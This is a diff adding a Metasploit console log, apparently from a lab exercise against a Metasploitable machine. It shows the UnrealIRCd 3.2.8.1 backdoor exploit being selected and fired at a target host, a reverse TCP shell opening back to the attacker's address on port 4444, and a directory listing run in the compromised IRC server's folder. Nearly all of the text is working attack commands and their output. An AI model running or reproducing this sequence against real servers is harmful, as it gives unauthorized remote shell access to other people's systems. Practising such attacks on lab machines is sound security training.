@@ -1,0 +1,42 @@
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.16.220
+RHOST => 192.168.16.220
+msf exploit(unreal_ircd_3281_backdoor) > exploit
+
+[*] Started reverse TCP double handler on 192.168.16.208:4444
+[*] 192.168.16.220:6667 - Connected to 192.168.16.220:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 192.168.16.220:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo Q6fZ8vBSTSIKyi8q;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "Q6fZ8vBSTSIKyi8q\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.16.208:4444 -> 192.168.16.220:46426) at 2017-04-30 11:45:47 -0400
+
+ls
+Donation
+LICENSE
+aliases
+badwords.channel.conf
+badwords.message.conf
+badwords.quit.conf
+curl-ca-bundle.crt
+dccallow.conf
+doc
+help.conf
+ircd.log
+ircd.pid
+ircd.tune
+modules
+networks
+spamfilter.conf
+tmp
+unreal
+unrealircd.conf
